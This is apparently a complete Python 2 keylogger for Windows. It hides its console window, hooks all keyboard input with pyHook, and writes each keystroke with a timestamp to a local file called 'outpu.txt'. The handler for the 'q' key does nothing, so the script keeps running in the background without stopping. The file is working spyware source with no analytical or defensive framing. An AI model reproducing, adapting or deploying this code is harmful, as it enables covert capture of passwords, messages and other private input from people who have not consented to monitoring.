import win32api
import win32console
import win32gui,sys
import time
import datetime
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
def write(event):
    try:
        f=open('outpu.txt','r')
        #print ord(keylogs)
        a=str(f.read())
        f.close()
        f1=open('outpu.txt','w')
        keylogs=a+str(chr(event.Ascii))+str('|')+str(datetime.datetime.today())+'\n'
        print keylogs
        f1.write(keylogs)
        f1.flush()
        f1.close()
    except:
        f11=open('outpu.txt','w')
        f11.close()

def OnKeyboardEvent(event):
    if chr(event.Ascii)=='q':

        #sys.exit()
        pass
    else:
        write(event)
    
    
    

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()

